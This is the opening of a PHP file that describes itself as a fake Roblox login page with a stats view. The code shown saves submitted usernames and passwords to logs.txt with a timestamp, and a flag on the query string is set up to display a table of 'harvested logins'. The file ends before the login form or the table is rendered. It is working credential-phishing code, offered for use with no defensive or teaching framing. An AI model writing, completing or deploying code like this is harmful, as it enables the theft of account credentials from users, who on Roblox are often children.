<?php
/* ==========================================================================
   Immortal – Fake Roblox Login + Stats Page
   ==========================================================================
   * This single file does three things:
   * 1) If the request is POST → save username/password to logs.txt
   * 2) If the request contains ?view=1 → show a table of all harvested logins
   * 3) Otherwise → show the login form (default view)
   ========================================================================== */

/* ──────────────────────
   0. Prepare & read the log file
   ────────────────────── */
$logFile = __DIR__.'/logs.txt';
$lines    = file($logFile, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES);

/* ──────────────────────
   1. Handle a POST from the form
   ────────────────────── */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    /* Append to logs.txt – use URL‑encoded values so we don’t have parsing problems */
    file_put_contents(
        $logFile,
        date('Y-m-d H:i:s').' – '.urlencode($user).'|'.urlencode($pass)."\n",
        FILE_APPEND
    );
}

/* ──────────────────────
   2. Decide what to display (form or table)
   ────────────────────── */
$showTable = isset($_GET['view']) && $_GET['view'] == '1';
?>
